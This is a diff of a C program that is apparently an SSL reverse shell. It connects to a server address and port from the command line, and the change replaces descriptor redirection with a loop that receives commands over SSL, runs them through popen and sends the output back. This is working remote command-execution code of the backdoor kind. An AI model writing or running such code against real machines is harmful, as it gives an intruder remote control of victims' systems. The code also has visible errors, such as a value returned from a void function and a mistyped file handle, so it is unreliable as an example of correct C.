@@ -136,23 +136,33 @@ void ssl_write(connection *c, char *text) {
     }
 }
 
+void usage(char *argv[]) {
+    printf("\nUsage: %s <ip of server> <port>\n", argv[0]);
+    return 1;
+}
+
 int main(int argc, char *argv[]) {
     if (argc != 3) {
-        printf("\nUsage: %s <ip of server> <port>\n", argv[0]);
-        return 1;
+        usage(argv);
     }
 
     connection *c;
     c = ssl_connect(argv[1], strtol(argv[2], NULL, 10)); 
 
-    dup2(c->socket, 0);
-    dup2(c->socket, 1);
-    dup2(c->socket, 2);
+    char *newline,buf[1028];
+    int *fd;
+    // This doesn't work...
+    //while (ssl_read(c) > 0) {
+    // This works...
+    while (SSL_read(c->sslHandle, buf, sizeof(buf)-1) > 0) {
+        newline = strchr(buf, '\n');
+        *newline = '\0';
 
-    // Here's where the magic happens
-    //execl(SHELL, SHELL, (char *)0);
+        fd = popen(buf, "r");
+        while (fgets(buf, sizeof(buf)-1, fd) > 0) {
+            ssl_write(c, buf);
+        }
+    }
     
-    ssl_write(c, "Well piss, this is working!");
-
     return 0;
 }
